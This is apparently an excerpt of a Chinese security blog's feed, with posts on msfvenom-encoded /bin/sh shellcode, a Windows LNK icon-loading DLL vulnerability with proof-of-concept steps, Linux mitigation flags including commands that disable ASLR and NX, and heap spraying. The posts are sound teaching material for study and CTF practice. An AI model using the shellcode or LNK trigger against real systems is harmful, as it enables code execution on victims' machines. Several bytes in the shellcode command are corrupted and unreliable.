shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">msfvenom -1 encoders | grep -i alphanumeric</span></span><br><span class="line">x86/alpha_mixed lowAlpha2 Alphanumeric Mixedcase Encoder</span><br><span class="line">x86/alpha_upperlowAlpha2 Alphanumeric Uppercase Encoder</span><br><span class="line">x86/unicode_mixedmanual Alpha2 Alphanumeric Unicode Mixedcase Encoder</span><br><span class="line">x86/unicode uDpermanual Alpha2 Alphanumeric Unicode Uppercase Encoder</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">python -c <span class="string">&#x27;import sys; sys.stdout.write(&quot;\x31\xc9\xf7\xel\xb0\x0b\x51\</span></span></span><br><span class="line"><span class="string"><span class="language-bash">x68\:&lt;2f\x2f\xT?3\x68\x68\x2f\x62\x69\x6e\x89\xo3\xcd\x80&quot;)&#x27;</span> | msfveno -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufterRegister=EAX</span> </span><br><span class="line">Attempting to encode payload with 1 iterations of x86/alpha_mixed </span><br><span class="line">x86/alpha_mixed succeeded with size 96 (iteration=0)</span><br><span class="line">x86/alpha mixed chosen with final size 96</span><br><span class="line">Payload size: 96 bytes</span><br><span class="line">PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI01o9igHah04Ksa3XTodot31</span><br><span class="line">xBHtorBcYpnniis8MOpAA</span><br></pre></td></tr></table></figure><blockquote><p>参考：</p><p>​<a href="https://www.cnblogs.com/lsgxeva/p/10794331.html">Linux下shellcode的编写</a></p><p>​<a href="https://zhuanlan.zhihu.com/p/212610634">带你玩转 Linux Shellcode</a></p><p>​<a href="https://www.freebuf.com/articles/system/237300.html">简述获取shellcode的几种方式</a></p><p>​<a href="https://cloud.tencent.com/developer/article/1930058?from=article.detail.1799682">Linux下Shellcode编写</a></p><p>​<a href="https://filippo.io/linux-syscall-table/">Linux Syscall Table</a></p><p>​《CTF竞赛权威指南》</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;1-什么是-shellcode&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-什么是-shellcode&quot;&gt;&lt;/a&gt; 1. 什么是 shellcode ？&lt;/h1&gt;
&lt;p&gt;shellcode 通常用机器语言</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="shellcode" scheme="https://www.rgzzplus.com/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>LNK快捷方式文件漏洞</title>
    <link href="https://www.rgzzplus.com/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.rgzzplus.com/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-08-01T10:26:50.000Z</published>
    <updated>2022-08-01T10:28:00.356Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="漏洞简介"><a class="markdownIt-Anchor" href="#漏洞简介"></a> 漏洞简介</h1><p>LNK 快捷方式文件漏洞，又叫 CPL Icon 加载漏洞。用户只要浏览一下 LNK 文件所在的目录病毒就能执行。</p><h1 id="漏洞原理及利用分析"><a class="markdownIt-Anchor" href="#漏洞原理及利用分析"></a> 漏洞原理及利用分析</h1><p>既然是快捷方式漏洞，那我们就先了解以下快捷方式文件的格式。</p><h2 id="快捷方式文件的格式"><a class="markdownIt-Anchor" href="#快捷方式文件的格式"></a> 快捷方式文件的格式</h2><p>快捷方式文件的结构是分段式的。</p><img src="/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220721221346481.png" alt="image-20220721221346481" style="zoom:50%;"><p>触发漏洞的数据保存在 Shell Item Id List 段中，所以我们只介绍该段的数据结构。</p><p>Shell Item Id List 段为可选段，一个快捷方式文件中是否存在 Shell Item Id List 段是由文件头中偏移 0x14 位置处的值来决定，0bit 值为 1 时，表示该 lnk 文件包含该结构。同时如果存在该结构，偏移 0x4c 的位置的会存在一个 unsigned short int 型的变量，用来标识 Shell Item Id List 结构的大小，紧随其后的为一系列的 SHITEMID 结构，该结构体定义如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SHITEMID</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> cb;<span class="comment">//cb标识一项SHITEMID结构大小</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> abID[<span class="number">0</span>];<span class="comment">//abID是可变结构，</span></span><br><span class="line">    <span class="comment">//存储具体数据，但第0项里面的</span></span><br><span class="line">    <span class="comment">//数据是不能修改的，</span></span><br><span class="line">    <span class="comment">//否则.lnk文件无法运行。</span></span><br><span class="line">&#125;SHITEMID,*LPSHITEMID;</span><br></pre></td></tr></table></figure><img src="/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220721222609971.png" alt="image-20220721222609971" style="zoom: 33%;"><p>漏洞触发的原理：SHELL32.DLL 在根据 Shell Item Id 加载快捷方式图标的时候未对被加载的项目（DLL 或者 CPL）进行有效性校验，造成了攻击者可能通过构造特殊的 Shell Item Id 来加载恶意的 DLL。</p><h2 id="漏洞文件生成"><a class="markdownIt-Anchor" href="#漏洞文件生成"></a> 漏洞文件生成</h2><p>实验环境：windows 2000 sp4</p><p>由于触发这个漏洞需要 CPL 加载机制，所以并不是所有的快捷方式文件都可以触发这个漏洞，只有指向控制面板下面功能的快捷方式才能够出发这个漏洞。</p><ol><li>建立基础 LNK 文件：<br>大家可以通过右键单击控制面板下面的图片，然后选择“创建快捷方式”选项来<strong>建立基础 LNK 文件</strong>。在这我们以“鼠标”为例。</li></ol><img src="/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220731143316381.png" alt="image-20220731143316381" style="zoom: 50%;"><ol start="2"><li>将建立好符合要求的基础 LNK 文件<strong>改造成能够触发漏洞的 POC 文件</strong>：<br>（1）用WinHex打开鼠标.LNK文件，将偏移 0x7A 到 0x7D 的 0x9CFFFFFF 修改为 0x00000000。需要注意的是，如果您在建立基础 LNK 文件时不是使用的“鼠标”项目， 0x7A 到 0x7D 的值可能不是 0x9CFFFFFF。</li></ol><img src="/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220726105411454.png" alt="image-20220726105411454" style="zoom: 67%;"><p>​（2）在偏移 0x8E 位置处写入我们要加载的 DLL 地址，在这我们使用 C:\DLL.DLL，其效果是弹出一个“test”对话框，当然您也可以选择使用其他的 DLL 来进行调试。</p><img src="/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220731143558861.png" alt="image-20220731143558861" style="zoom:50%;"><h2 id="漏洞产生原理"><a class="markdownIt-Anchor" href="#漏洞产生原理"></a> 漏洞产生原理</h2><p>这个 POC 的最终目的是加载一个 DLL 文件，所以我们可以先在 LoadLibraryW 函数上设置断点，然后再通过回溯函数调用过程的方式找到上层函数，最终找到出问题的函数。</p><p>首先，我们先用下面的源码 再vc6.0中编写一个能弹出对话框的 DLL 文件，然后把这个文件重命名为 DLL.DLL 并放到 C 盘下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//DLL.dll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HANDLE hModule, </span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call, </span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params"> )</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>,<span class="string">&quot;Hello World&quot;</span>,<span class="string">&quot;Test&quot;</span>,MB_OK);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再用 OllyDbg 附加到 explorer.exe 的进程上，对 LoadLibraryW 函数设置断点，接下来浏览以下保存我们修改的 LNK 文件的目录。此时，可能会出现两种情况。</p><ol><li>OllyDbg 中断触发。如果是这样我们就能在 view --&gt;Call stack 菜单中查看当前函数调用情况。</li><li>OllyDbg 中断未触发，这是因为您已经浏览过这个目录。由于快捷方式图标的加载具有缓存机制，如果以前已经加载过，现在他就不会再重复加载。此时您可以将 LNK 文件重命名，之后 OllyDbg 中的断点就可以触发了。</li></ol><p><img src="/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220731154330734.png" alt="image-20220731154330734"></p><p>中断后，我们能在栈中看到本次 LoadLibraryW 函数调用的 FileName 参数为 “C:\DLL.DLL”，说明我们找对地方了，并且我这里也直接出现了弹出框。如果没有看到这个参数，那就多按几次 F9。</p><p>接下来我们通过 Call stack 查看函数调用情况。<br><img src="/2022/08/01/LNK%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20220731154949928.png" alt="image-20220731154949928"></p><p>shell32在处理lnk文件的时候要把它的图标显示出来，对于一般文件应该是从Icon filename string里面解析，但对于文件后面没有Icon filename string结构的控制面板快捷方式，是直接从0x7A那里的iconindex来解析。当这个iconindex是0的时候，会去加载cpl文件，调用CPlApplet接口，这样就存在执行DLL中代码的问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">7D716064    53              push    ebx</span><br><span class="line">7D716065    FF75 10         push    dword ptr [ebp+10]</span><br><span class="line">7D716068    8D5E 0C         lea     ebx, dword ptr [esi+C]</span><br><span class="line">7D71606B    53              push    ebx</span><br><span class="line">7D71606C    FF75 0C         push    dword ptr [ebp+C]      ;C:\dll.dll,0,&lt;-这个0就是从偏移7A那里得到的iconindex</span><br><span class="line">7D71606F    FF15 0015597D   call    dword ptr [&lt;&amp;KERNEL32.lstrcpynW&gt;&gt;; kernel32.lstrcpynW</span><br><span class="line">7D716075    6A 2C           push    2C</span><br><span class="line">7D716077    FF75 0C         push    dword ptr [ebp+C]</span><br><span class="line">7D71607A    FF15 F41B597D   call    dword ptr [&lt;&amp;SHLWAPI.StrChrW&gt;]   ; shlwapi.StrChrW</span><br><span class="line">7D716080    85C0            test    eax, eax</span><br><span class="line">7D716082    74 5D           je      short 7D7160E1</span><br><span class="line">7D716084    66:8320 00      and     word ptr [eax], 0</span><br><span class="line">7D716088    83C0 02         add     eax, 2</span><br><span class="line">7D71608B    50              push    eax</span><br><span class="line">7D71608C    FF15 641C597D   call    dword ptr [&lt;&amp;SHLWAPI.StrToIntW&gt;] ; shlwapi.StrToIntW</span><br><span class="line">7D716092    8B7D 14         mov     edi, dword ptr [ebp+14]</span><br><span class="line">7D716095    8907            mov     dword ptr [edi], eax</span><br><span class="line">7D716097    8B45 18         mov     eax, dword ptr [ebp+18]</span><br><span class="line">7D71609A    C700 02000000   mov     dword ptr [eax], 2</span><br><span class="line">7D7160A0    8B0F            mov     ecx, dword ptr [edi]</span><br><span class="line">7D7160A2    33D2            xor     edx, edx</span><br><span class="line">7D7160A4    3BCA            cmp     ecx, edx      ;偏移0x7A必须得是0，才会LoadLibary</span><br><span class="line">7D7160A6    75 33           jnz     short 7D7160DB</span><br><span class="line">7D7160A8    C700 1A000000   mov     dword ptr [eax], 1A</span><br><span class="line">7D7160AE    8D86 14020000   lea     eax, dword ptr [esi+214]</span><br><span class="line">7D7160B4    3910            cmp     dword ptr [eax], edx</span><br><span class="line">7D7160B6    8955 0C         mov     dword ptr [ebp+C], edx</span><br><span class="line">7D7160B9    75 16           jnz     short 7D7160D1</span><br><span class="line">7D7160BB    8D4D 0C         lea     ecx, dword ptr [ebp+C]</span><br><span class="line">7D7160BE    51              push    ecx</span><br><span class="line">7D7160BF    8D8E 18020000   lea     ecx, dword ptr [esi+218]</span><br><span class="line">7D7160C5    51              push    ecx</span><br><span class="line">7D7160C6    50              push    eax</span><br><span class="line">7D7160C7    53              push    ebx</span><br><span class="line">7D7160C8    E8 48C4F2FF     call    7D642515      ;这里调用后面</span><br><span class="line"> </span><br><span class="line">后面</span><br><span class="line">7D63866D    FF15 6415597D   call    dword ptr [&lt;&amp;KERNEL32.GetCurrent&gt;; kernel32.GetCurrentProcessId</span><br><span class="line">7D638673    50              push    eax</span><br><span class="line">7D638674    56              push    esi</span><br><span class="line">7D638675    68 00001000     push    100000                           ; UNICODE &quot;f1df_6.0.2600.5512_x-ww_35d4ce83\&quot;</span><br><span class="line">7D63867A    8985 E4FDFFFF   mov     dword ptr [ebp-21C], eax</span><br><span class="line">7D638680    FF15 6815597D   call    dword ptr [&lt;&amp;KERNEL32.OpenProces&gt;; kernel32.OpenProcess</span><br><span class="line">7D638686    3BC6            cmp     eax, esi</span><br><span class="line">7D638688    8985 E8FDFFFF   mov     dword ptr [ebp-218], eax</span><br><span class="line">7D63868E    0F84 E5000000   je      7D638779</span><br><span class="line">7D638694    8D85 F4FDFFFF   lea     eax, dword ptr [ebp-20C]</span><br><span class="line">7D63869A    50              push    eax</span><br><span class="line">7D63869B    FF15 A41C597D   call    dword ptr [&lt;&amp;SHLWAPI.PathFileExi&gt;; shlwapi.PathFileExistsW</span><br><span class="line">7D6386A1    85C0            test    eax, eax</span><br><span class="line">7D6386A3    C785 BCFDFFFF 2&gt;mov     dword ptr [ebp-244], 20</span><br><span class="line">7D6386AD    74 14           je      short 7D6386C3</span><br><span class="line">7D6386AF    8D85 F4FDFFFF   lea     eax, dword ptr [ebp-20C]</span><br><span class="line">7D6386B5    89B5 C0FDFFFF   mov     dword ptr [ebp-240], esi</span><br><span class="line">7D6386BB    8985 C4FDFFFF   mov     dword ptr [ebp-23C], eax</span><br><span class="line">7D6386C1    EB 1A           jmp     short 7D6386DD</span><br><span class="line">7D6386C3    C785 C0FDFFFF 0&gt;mov     dword ptr [ebp-240], 8</span><br><span class="line">7D6386CD    899D C4FDFFFF   mov     dword ptr [ebp-23C], ebx</span><br><span class="line">7D6386D3    C785 D0FDFFFF 7&gt;mov     dword ptr [ebp-230], 7B</span><br><span class="line">7D6386DD    8D85 BCFDFFFF   lea     eax, dword ptr [ebp-244]</span><br><span class="line">7D6386E3    50              push    eax</span><br><span class="line">7D6386E4    FF15 6C15597D   call    dword ptr [&lt;&amp;KERNEL32.CreateActC&gt;; kernel32.CreateActCtxW</span><br><span class="line">7D6386EA    83F8 FF         cmp     eax, -1</span><br><span class="line">7D6386ED    8985 F0FDFFFF   mov     dword ptr [ebp-210], eax</span><br><span class="line">7D6386F3    75 06           jnz     short 7D6386FB</span><br><span class="line">7D6386F5    89B5 F0FDFFFF   mov     dword ptr [ebp-210], esi</span><br><span class="line">7D6386FB    8B3D 8C15597D   mov     edi, dword ptr [&lt;&amp;KERNEL32.Activ&gt;; kernel32.ActivateActCtx</span><br><span class="line">7D638701    8D85 ECFDFFFF   lea     eax, dword ptr [ebp-214]</span><br><span class="line">7D638707    50              push    eax</span><br><span class="line">7D638708    FFB5 F0FDFFFF   push    dword ptr [ebp-210]</span><br><span class="line">7D63870E    FFD7            call    edi</span><br><span class="line">7D638710    33F6            xor     esi, esi</span><br><span class="line">7D638712    46              inc     esi</span><br><span class="line">7D638713    56              push    esi</span><br><span class="line">7D638714    56              push    esi</span><br><span class="line">7D638715    56              push    esi</span><br><span class="line">7D638716    53              push    ebx</span><br><span class="line">7D638717    FF15 00F0787D   call    dword ptr [7D78F000]             ; apphelp.ApphelpCheckExe</span><br><span class="line">7D63871D    85C0            test    eax, eax</span><br><span class="line">7D63871F    75 08           jnz     short 7D638729</span><br><span class="line">7D638721    2185 E0FDFFFF   and     dword ptr [ebp-220], eax</span><br><span class="line">7D638727    EB 0D           jmp     short 7D638736</span><br><span class="line">7D638729    53              push    ebx             ;加载DLL</span><br><span class="line">7D63872A    FF15 A015597D   call    dword ptr [&lt;&amp;KERNEL32.LoadLibrar&gt;; kernel32.LoadLibraryW</span><br><span class="line">7D638730    8985 E0FDFFFF   mov     dword ptr [ebp-220], eax         ; dll.01C00000</span><br></pre></td></tr></table></figure><blockquote><p>参考：</p><p>​<a href="https://bbs.pediy.com/thread-117232.htm">LNK快捷方式文件漏洞简要分析</a></p><p>​0day2：软件漏洞分析精要</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;漏洞简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#漏洞简介&quot;&gt;&lt;/a&gt; 漏洞简介&lt;/h1&gt;
&lt;p&gt;LNK 快捷方式文件漏洞，又叫 CPL Icon 加载漏洞。用户只要浏览一下 LNK 文件所在的目录病毒就</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="漏洞" scheme="https://www.rgzzplus.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Linux中的保护机制</title>
    <link href="https://www.rgzzplus.com/2022/08/01/Linux%E4%B8%AD%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <id>https://www.rgzzplus.com/2022/08/01/Linux%E4%B8%AD%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</id>
    <published>2022-08-01T10:24:46.000Z</published>
    <updated>2022-08-01T15:03:15.289Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了NX、PIE等机制，例如存在NX的话就不能直接执行栈上的数据，存在PIE 的话各个系统调用的地址就是随机化的。</p><h1 id="一canary栈保护"><a class="markdownIt-Anchor" href="#一canary栈保护"></a> 一：canary（栈保护）</h1><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p><p>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，</p><p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p><p>1、gcc -o test test.c // 默认情况下，不开启Canary保护</p><p>2、gcc <strong>-fno-stack-protector</strong> -o test test.c //禁用栈保护</p><p>3、gcc <strong>-fstack-protector</strong> -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</p><p>4、gcc <strong>-fstack-protector-all</strong> -o test test.c //启用堆栈保护，为所有函数插入保护代码</p><h1 id="二nxno-execute"><a class="markdownIt-Anchor" href="#二nxno-execute"></a> 二：NX（no execute）</h1><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><p><img src="/2022/08/01/Linux%E4%B8%AD%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/1515742-20190721232115382-1400699323.png" alt="img"></p><p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。 例如：</p><p>1、gcc -o test test.c // 默认情况下，开启NX保护</p><p>2、gcc -z execstack -o test test.c // 禁用NX保护</p><p>3、gcc -z noexecstack -o test test.c // 开启NX保护</p><p>在Windows下，类似的概念为DEP（数据执行保护）</p><h1 id="三pieposition-independent-executables"><a class="markdownIt-Anchor" href="#三pieposition-independent-executables"></a> 三：PIE（position-independent executables）</h1><p><strong>位置独立的可执行区域</strong>。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。内存地址随机化机制（address space layout randomization)，有以下三种情况：</p><p>0 - 表示关闭进程地址空间随机化。</p><p>1 - 表示将mmap的基址，stack和vdso页面随机化。</p><p>2 - 表示在1的基础上增加栈（heap）的随机化。</p><p>liunx下关闭PIE的命令如下：</p><p>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</p><p>gcc编译命令：</p><p>1、gcc -o test test.c // 默认情况下，不开启PIE</p><p>2、gcc -fpie -pie -o test test.c // 开启PIE，此时强度为1</p><p>3、gcc -fPIE -pie -o test test.c // 开启PIE，此时为最高强度2</p><p>4、gcc -fpic -o test test.c // 开启PIC，此时强度为1，不会开启PIE</p><p>5、gcc -fPIC -o test test.c // 开启PIC，此时为最高强度2，不会开启PIE</p><h1 id="四relro-read-only-relocation"><a class="markdownIt-Anchor" href="#四relro-read-only-relocation"></a> 四：RELRO（ read only relocation）</h1><p>在Linux系统安全领域，数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处。GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术:。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p><p>gcc编译：</p><p>gcc -o test test.c // 默认情况下，是Partial RELRO</p><p>gcc -z norelro -o test test.c // 关闭，即No RELRO</p><p>gcc -z lazy -o test test.c // 部分开启，即Partial RELRO</p><p>gcc -z now -o test test.c // 全部开启</p><h1 id="五-总结"><a class="markdownIt-Anchor" href="#五-总结"></a> 五 总结</h1><p>各种安全选择的编译参数如下：</p><ul><li>NX：-z execstack / -z noexecstack (关闭 / 开启)</li><li>Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)</li><li>PIE：-no-pie / -pie (关闭 / 开启)</li><li>RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)</li></ul><blockquote><p>参考资料：<a href="https://www.cnblogs.com/Spider-spiders/p/8798628.html">https://www.cnblogs.com/Spider-spiders/p/8798628.html</a></p><p>本文转载于：<a href="https://www.cnblogs.com/ncu-flyingfox/p/11223390.html">狐狸在飞</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了NX、PIE等机制，例如存在NX的话就不能直接执行栈上的数据，存在PIE 的话各个系统调用的地址就是随机化的。&lt;/p&gt;
&lt;h1 id=&quot;一canary栈保护&quot;&gt;&lt;a class=&quot;markdo</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="Linux保护机制" scheme="https://www.rgzzplus.com/tags/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>HeapSpary技术及疑问</title>
    <link href="https://www.rgzzplus.com/2022/07/27/HeapSpary%E6%8A%80%E6%9C%AF%E5%8F%8A%E7%96%91%E9%97%AE/"/>
    <id>https://www.rgzzplus.com/2022/07/27/HeapSpary%E6%8A%80%E6%9C%AF%E5%8F%8A%E7%96%91%E9%97%AE/</id>
    <published>2022-07-27T08:08:48.000Z</published>
    <updated>2022-07-27T08:10:06.731Z</updated>
    
    <content type="html"><![CDATA[<h2 id="为什么heap-spary要用0x0c0c0c0c这个奇怪的数字"><a class="markdownIt-Anchor" href="#为什么heap-spary要用0x0c0c0c0c这个奇怪的数字"></a> 为什么heap spary要用0x0C0C0C0C这个奇怪的数字？</h2><p>在讨论这个问题之前，先向小白介绍一下<strong>什么是 Heap Spary？</strong></p><p>Heap Spary 又叫堆喷射，是在 shellcode 的前面加上大量的slide code(滑板指令)，组成一个注入代码段。然后向系统申请大量内存，并且反复用注入代码段来填充。这样就使得内存被大量的注入代码占据。然后通过结合其他漏洞控制程序流，使得程序执行到堆上，最终将导致shellcode的执行。</p><hr><p><strong>Heap Spary 执行流程：</strong></p><p><em>堆喷射将 shellcode放置在了堆中，在堆中执行代码。</em></p><ol><li><p>使用浏览器程序打开我们的poc样本时，它会执行我们样本文件中的JavaScript代码。</p></li><li><p>控制程序eip，使其指向0x0C0C0C0C地址。</p></li></ol><hr><p>了解到 Heap Spary 后，再来讨论，<strong>为什么一定要用 0x0C0C0C0C 填充滑板指令？</strong></p><p>（1）0x0C0C0C0C会被程序解释成 OR AL,0C 可以作为滑板指令（即<strong>执行此种指令不会对程序的后续行为产生影响</strong>），有人说为什么不使用0x90（也是滑板指令）呢？请看下一条。</p><p>（2）之前说过，我们的shellcode会被放到堆中去执行，也就是所谓的使eip指向0x0C0C0C0C这个地址，而0x0C0C0C0C这个地址从0计算的话，大概在192mb左右，但0x90909090就不言而喻了，需要申请的堆空间那就相当大了。</p><hr><p>又有人会说<strong>为甚麽一定要让我们的eip指向0x0C0C0C0C呢？</strong></p><p>堆喷射成功的前提是，我们填充的过程中恰好覆盖了一个虚函数指针，当该虚函数被调用时，先取得栈中的对象指针，通过对象指针取得虚表指针，然后在虚表内适当偏移处取得函数指针执行，过程如下：</p><p><img src="https://img-blog.csdnimg.cn/20200313193154842.png" alt="img"></p><p>因此根据上述过程，当我们使用“0c0c0c0c”作为slide code进行填充时，我们地址0x0c0c0c0c处也必须为“0c0c0c0c”，而正由于这个地址是自指向的，因此恰好执行“0c0c0c0c”命令直到执行shellcode。若为其他地址，将会导致指针跳转至其他地方，无法确保完成shellcode的执行。<br>  也可以通过缓冲区溢出漏洞将EIP修改为0x0c0c0c0c就能跳转到该位置，然后完成shellcode的执行。</p><blockquote><p>参考：</p><p>​<a href="https://blog.csdn.net/m0_46161993/article/details/104846792">Heap Spary原理</a></p><p>​<a href="https://zhuanlan.zhihu.com/p/50891465">初识堆喷射及事例(暴雷漏洞)分析</a></p><p>​<a 